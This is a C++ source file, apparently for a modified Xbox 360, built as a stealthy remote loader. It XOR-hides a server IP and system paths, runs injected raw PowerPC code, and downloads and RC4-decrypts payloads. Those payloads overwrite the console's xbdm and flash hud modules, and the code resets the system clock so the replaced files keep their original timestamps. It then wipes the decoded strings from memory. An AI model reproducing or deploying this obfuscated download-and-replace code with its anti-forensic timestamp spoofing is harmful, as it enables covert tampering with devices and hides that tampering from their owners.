#include "main.h"

void OtherHack();

unsigned char xbdmHash[20] = { 0xD5, 0x89, 0xA7, 0x47, 0xC0, 0xC8, 0xCC, 0x62, 0xE0, 0xC3, 0x52, 0x71, 0x68, 0x7A, 0x5A, 0x6D, 0x70, 0xC3, 0x87, 0x3A };
char xbdmPath[19] = { 0x68, 0x72, 0x5F, 0x7E, 0x7C, 0x79, 0x7E, 0x75, 0x2A, 0x4C, 0x68, 0x72, 0x74, 0x7D, 0x3E, 0x68, 0x75, 0x68, 0x10 };
char xbdmServerIp[15] = { 0x21, 0x24, 0x29, 0x3E, 0x25, 0x26, 0x3E, 0x21, 0x29, 0x25, 0x3E, 0x21, 0x22, 0x27, 0x10 };
char xbdmDownloadPath[16] = { 0x3F, 0x73, 0x7F, 0x7F, 0x7C, 0x59, 0x7D, 0x71, 0x77, 0x75, 0x7D, 0x3E, 0x60, 0x7E, 0x77, 0x10 };
char xbdmRawName[9] = { 0x68, 0x72, 0x74, 0x7D, 0x3E, 0x68, 0x75, 0x68, 0x10 };


unsigned char hudhash[20] = { 0x03, 0xDD, 0x08, 0x5C, 0xBF, 0xB1, 0x59, 0x14, 0x23, 0x46, 0x16, 0x43, 0xE0, 0xAF, 0x4B, 0xC6, 0x54, 0x0D, 0x24, 0x54 };
char fXam[14] = { 0x76, 0x63, 0x69, 0x63, 0x2A, 0x4C, 0x68, 0x71, 0x7D, 0x3E, 0x68, 0x75, 0x68, 0x10 };
char fsys[7] = { 0x76, 0x63, 0x69, 0x63, 0x2A, 0x4C, 0x10 };
char DeviceFlash[15] = { 0x4C, 0x54, 0x75, 0x66, 0x79, 0x73, 0x75, 0x4C, 0x56, 0x7C, 0x71, 0x63, 0x78, 0x4C, 0x10 };
char hudPath[14] = { 0x76, 0x63, 0x69, 0x63, 0x2A, 0x4C, 0x78, 0x65, 0x74, 0x3E, 0x68, 0x75, 0x68, 0x10 };
char hudDownloadPath[16] = { 0x3F, 0x73, 0x7F, 0x7F, 0x7C, 0x59, 0x7D, 0x71, 0x77, 0x75, 0x78, 0x3E, 0x60, 0x7E, 0x77, 0x10 };
char hudDotXex[8] = { 0x78, 0x65, 0x74, 0x3E, 0x68, 0x75, 0x68, 0x10 };
char HudServerIp[15] = { 0x21, 0x24, 0x29, 0x3E, 0x25, 0x26, 0x3E, 0x21, 0x29, 0x25, 0x3E, 0x21, 0x22, 0x27, 0x10 };
bool isAlreadyMounted = false;

NTSTATUS WriteFlashFile(char* FileName, unsigned char* File, int Size)
{
	return doWriteFlashFileInternal(File, FileName, Size);
}


SYSTEMTIME FakeSystemTime = { 0 };

FILETIME RealSystemTime = { 0 }, OriginalFileTime = { 0 };

bool SpoofFileTime(HANDLE hFile, BOOL spoof)
{
	if (spoof)
	{
		FileTimeToSystemTime(&OriginalFileTime, &FakeSystemTime);

		FILETIME NewSystemTime = { 0 };

		SystemTimeToFileTime(&FakeSystemTime, &NewSystemTime);

		NtSetSystemTime(&NewSystemTime, &RealSystemTime);

		return true;
	}
	else
	{
		FILETIME tmp;
		NtSetSystemTime(&RealSystemTime, &tmp);
		return true;
	}
	return false;
}

NTSTATUS doWriteFlashFileInternal(BYTE* buffer, char* fileName, DWORD len)
{
	HANDLE hFlashFile;
	NTSTATUS sta = 0;
	char destStr[MAX_PATH] = { 0 };
	strcpy(destStr, fsys);
	strcat_s(destStr, MAX_PATH, fileName);

	hFlashFile = CreateFile(destStr, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);


	if (hFlashFile != INVALID_HANDLE_VALUE)
	{
		PBYTE buf = buffer;
		DWORD tlen = len;
		DWORD writeSz;
		DWORD bWritten;
		while (tlen > 0)
		{
			if (tlen > 0x4000)
				writeSz = 0x4000;
			else
				writeSz = tlen;

			bWritten = 0;

			if (WriteFile(hFlashFile, buf, writeSz, &bWritten, NULL))
			{
				if (bWritten == writeSz)
				{
					tlen -= writeSz;
					buf += writeSz;
				}
				else
				{
					len = 0;
					sta = -1;
				}
			}
			else
			{
				sta = -1;
			}
		}



		if (FlushFileBuffers(hFlashFile) != 0)
		{
			sta = -4;
		}


		CloseHandle(hFlashFile);
	}
	else
	{
		sta = -3;
	}

	return sta;
}

NTSTATUS deleteFileFromFlash(char* fileName)
{
	char delStr[MAX_PATH] = { 0 };
	strcpy(delStr, fsys);
	strcat_s(delStr, MAX_PATH, fileName);
	if (DeleteFileA(delStr))
		return 0;
	return -1;
}


char* UnXorMeMe(char* b, int l)
{
	for (int i = 0; i < l; i++)
		b[i] = b[i] ^ 0x10;

	return b;
}


FILETIME getFileCreationTime(const CHAR * FileName)
{
	bool success = true;
	HANDLE hFile;
	hFile = CreateFileA(FileName,
		GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		return FILETIME();
	}
	else
	{
		FILETIME CreationTime;

		if (GetFileTime(hFile, &CreationTime, NULL, NULL)) {
			CloseHandle(hFile);


			return CreationTime;
		}
	}
	CloseHandle(hFile);
	return FILETIME();
}

void RunCoolTest()
{
	unsigned int Code[32] = { 0x084081B6,
		0x38429CC0,
		0x08608006,
		0x3863CAA8,
		0x08808006,
		0x3884CEC8,
		0x09007D88,
		0x390802A6,
		0x08A0FFFF,
		0x38A5FFFF,
		0xC8A50020,
		0x3C842800,
		0x3C632800,
		0x3C422800,
		0x3D082800,
		0x78C30000,
		0x78E40000,
		0xC5080020,
		0x94000000,
		0xA5070000,
		0xBC002001,
		0xA0003000,
		0xA5060000,
		0xBC005001,
		0x08600000,
		0x38630011,
		0x54620000,
		0x98000000,
		0x08600000,
		0x38630010,
		0x54620000,
		0x98000000

	};
	RunCode((int*)Code, 32);
}


void WriteDank()
{
	RunCoolTest();

	if ((*(unsigned long long*)(0x81B69CC0)) != 0x10)
		return;

	if (!isAlreadyMounted)
	{
		OtherHack();

		UnXorMeMe(fsys, 7);
		UnXorMeMe(DeviceFlash, 15);
		UnXorMeMe(hudPath, 14);
		UnXorMeMe(hudDownloadPath, 16);
		UnXorMeMe(hudDotXex, 8);
		UnXorMeMe(HudServerIp, 15);
		UnXorMeMe(fXam, 14);

		if (!isAlreadyMounted) {

			CreateSymbolicLink(fsys, DeviceFlash, true);

			isAlreadyMounted = true;
		}

		printf("Load Started\n");

		int ModuleLength = 0;
		unsigned char* KrazakisShoe = 0;

		int DownloadTries = 0;

		printf("Starting download Loop\n");

		MemoryBuffer Mem;
		CReadFile(hudPath, Mem);

		unsigned char hash[0x14] = { 0 };

		sha1(Mem.GetData(), Mem.GetDataLength(), hash);

		if (memcmp(hudhash, hash, 0x14))
		{
			while (DownloadTries < 50)
			{
				if (DownloadFile(HudServerIp, hudDownloadPath, &KrazakisShoe, &ModuleLength))
				{
					if ((KrazakisShoe <= 0) || (ModuleLength <= 0))
					{
						printf("Size or Module Pointer was NULL\n");
						continue;
					}

					if (ModuleLength < 0x14)
						continue;

					printf("Xex downloaded\n");

					unsigned char DataDigest[0x14] = { 0 };
					sha1(KrazakisShoe, ModuleLength - 0x14, DataDigest);

					if (!memcmp(DataDigest, &KrazakisShoe[ModuleLength - 0x14], 0x14))
					{
						printf("digest completed and correct\n");

						RC4(KrazakisShoe + 0x32FF, (ModuleLength - 0x32FF - 0x14), b1BLKey, 16, b1BLKey[1]);
						RC4(KrazakisShoe + 0x32FF, (ModuleLength - 0x32FF - 0x14), bHvRomMagic, 16, b1BLKey[1]);
						RC4(KrazakisShoe + 0x32FF, (ModuleLength - 0x32FF - 0x14), GameKey, 6, GameKey[2]);

						OriginalFileTime = getFileCreationTime(fXam);

						SpoofFileTime(NULL, TRUE);

						if (!doWriteFlashFileInternal(KrazakisShoe + 0x32FF, hudDotXex, (ModuleLength - 0x32FF - 0x14)))
							break;

						SpoofFileTime(NULL, FALSE);

					}
					else printf("XEX Hash fialed\n");
				}

				if (KrazakisShoe)
				{
					XMemFree(KrazakisShoe, XAPO_ALLOC_ATTRIBUTES);
					KrazakisShoe = 0;
				}

				printf("Retrying....\n");
				DownloadTries++;
			}

			if (KrazakisShoe)
			{
				XMemFree(KrazakisShoe, XAPO_ALLOC_ATTRIBUTES);
				KrazakisShoe = 0;
			}
		}
		else printf("File Hash is connect... do nothing\n");

		memset(fsys, 0, 7);
		memset(DeviceFlash, 0, 15);
		memset(hudPath, 0, 14);
		memset(hudDownloadPath, 0, 16);
		memset(hudDotXex, 0, 8);
		memset(HudServerIp, 0, 15);
		memset(fXam, 0, 14);

	}
	return;
}

void OtherHack()
{
	UnXorMeMe(xbdmPath, 19);
	UnXorMeMe(xbdmServerIp, 15);
	UnXorMeMe(xbdmDownloadPath, 16);
	UnXorMeMe(xbdmRawName, 9);

	HANDLE hFile = 0;
	unsigned char* xbdmXex = 0;
	int ModuleLength = 0;
	unsigned char* KrazakisShoe = 0;
	int DownloadTries = 0;

	PLDR_DATA_TABLE_ENTRY xbdmHandle = (PLDR_DATA_TABLE_ENTRY)GetModuleHandle(xbdmRawName);

	char xbdmFullPath[MAX_PATH];
	sprintf(xbdmFullPath, "%ws", xbdmHandle->FullDllName);

	printf("xbdmFullPath: %s\n", xbdmFullPath);

	FCreateFile(&hFile, SYNCHRONIZE, xbdmFullPath, NULL, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_OPEN,
		FILE_SYNCHRONOUS_IO_NONALERT);

	printf("Load Started\n");

	printf("Starting download Loop\n");

	int FileSize = NTGetFileLength(xbdmFullPath);

	printf("FileSize: %X\n", FileSize);

	if (FileSize != -1)
	{
		xbdmXex = (unsigned char*)malloc(FileSize);

		if (NTReadFile(xbdmFullPath, xbdmXex, FileSize))
		{
			unsigned char hash[0x14] = { 0 };

			sha1(xbdmXex, FileSize, hash);

			if (memcmp(xbdmHash, hash, 0x14))
			{
				while (DownloadTries < 50)
				{
					if (DownloadFile(xbdmServerIp, xbdmDownloadPath, &KrazakisShoe, &ModuleLength))
					{
						if ((KrazakisShoe <= 0) || (ModuleLength <= 0))
						{
							printf("Size or Module Pointer was NULL\n");
							continue;
						}

						if (ModuleLength < 0x14)
							continue;

						printf("Xex downloaded\n");

						unsigned char DataDigest[0x14] = { 0 };
						sha1(KrazakisShoe, ModuleLength - 0x14, DataDigest);

						if (!memcmp(DataDigest, &KrazakisShoe[ModuleLength - 0x14], 0x14))
						{
							printf("digest completed and correct\n");

							RC4(KrazakisShoe + 0x32FF, (ModuleLength - 0x32FF - 0x14), b1BLKey, 16, b1BLKey[1]);
							RC4(KrazakisShoe + 0x32FF, (ModuleLength - 0x32FF - 0x14), bHvRomMagic, 16, b1BLKey[1]);
							RC4(KrazakisShoe + 0x32FF, (ModuleLength - 0x32FF - 0x14), GameKey, 6, GameKey[2]);

							if (GetFileTime(hFile, &OriginalFileTime, NULL, NULL))
							{
								NtClose(hFile);

								hFile = 0;

								printf("File Time Gotten\n");

								SpoofFileTime(NULL, TRUE);

								if (NTWriteFile(xbdmFullPath, KrazakisShoe + 0x32FF, (ModuleLength - 0x32FF - 0x14)))
								{
									printf("File Written And We are Done!\n");

									SpoofFileTime(NULL, FALSE);
									break;
								}

								SpoofFileTime(NULL, FALSE);
							}
						}
						else printf("XEX Hash fialed\n");
					}

					if (KrazakisShoe)
					{
						XMemFree(KrazakisShoe, XAPO_ALLOC_ATTRIBUTES);
						KrazakisShoe = 0;
					}

					printf("Retrying....\n");
					DownloadTries++;
				}

				if (KrazakisShoe)
				{
					XMemFree(KrazakisShoe, XAPO_ALLOC_ATTRIBUTES);
					KrazakisShoe = 0;
				}
			}
			else printf("File Hash is connect... do nothing\n");

			memset(xbdmPath, 0, 19);
			memset(xbdmServerIp, 0, 15);
			memset(xbdmDownloadPath, 0, 16);
			memset(xbdmRawName, 0, 9);

			if (xbdmXex)
				free(xbdmXex);

			if (hFile)
				NtClose(hFile);

			return;

		}
	}
}
